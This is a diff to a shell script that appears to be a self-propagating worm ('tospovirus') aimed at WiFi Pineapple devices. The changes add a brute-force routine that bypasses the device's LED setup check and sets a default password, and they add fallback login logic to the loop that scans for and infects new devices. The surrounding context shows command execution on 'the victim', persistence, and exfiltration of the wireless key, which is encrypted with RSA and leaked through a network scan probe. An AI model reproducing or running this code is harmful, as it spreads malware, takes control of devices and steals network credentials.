@@ -5,6 +5,7 @@
 #   email (guess)
 #   
 
+#Get a copy of our SSID which we'll black list so we don't do something silly like try to infect ourselves
 self=`uci get wireless.@wifi-iface[0].ssid`
 
 init() {
@@ -36,7 +37,7 @@ init() {
 #  The password for that SSID
 #  This device's IP address
 #  Etc.
-#The counter to this is popstate (see below).
+#The reverse of this is popstate (see below).
 pushstate() {
 	echo "Pushing state..."
 	uci export wireless > /tospo/w
@@ -121,13 +122,27 @@ post() {
 	printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
 }
 
+#Function solves the LED puzzle
+bf() {
+	echo "Brute forcing..."
+	session=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
+	for n in `seq 1 $1`
+	do
+		echo "Trying $n time..."
+	        post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$session" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$session" | grep "success" && return 0
+	done
+	#return 1 - Failed!
+	return 1
+}
 #Function uses the post function to login for this session "tospovirus" which is the default session
 #Once logged in other actions may be performed.
 login() {
 	echo "Logging in..."
 	creds="username=root&password=pineapplesareyummy&login="
-	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && popstate && exit
+	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && return 1
 	echo "Logged in Successfully!"
+	#return 0 - Succeeded!
+	return 0
 }
 
 #Function uses post function to execute commands on the victim. This is the heart and soul.
@@ -159,6 +174,7 @@ exfiltrate() {
 	which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key" | cut -d"'" -f2 | openssl rsautl -encrypt -pubin -inkey /tospo/tvd.pub)" >/dev/null
 }
 
+#Run the virus...
 init
 exfiltrate
 echo "Scanning for new devices..."
@@ -166,7 +182,9 @@ for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$s
 do
 	pushstate
 	connect `echo $net | cut -d '"' -f 2`
-	login 
+	#Login - if this fails, brute force then login, if that fails, bail out this one is a no-winner.
+	#TODO: Generate a blacklist and blacklist this device?
+	login || (bf && login || popstate && break)
 	infect
 	persist
 	popstate
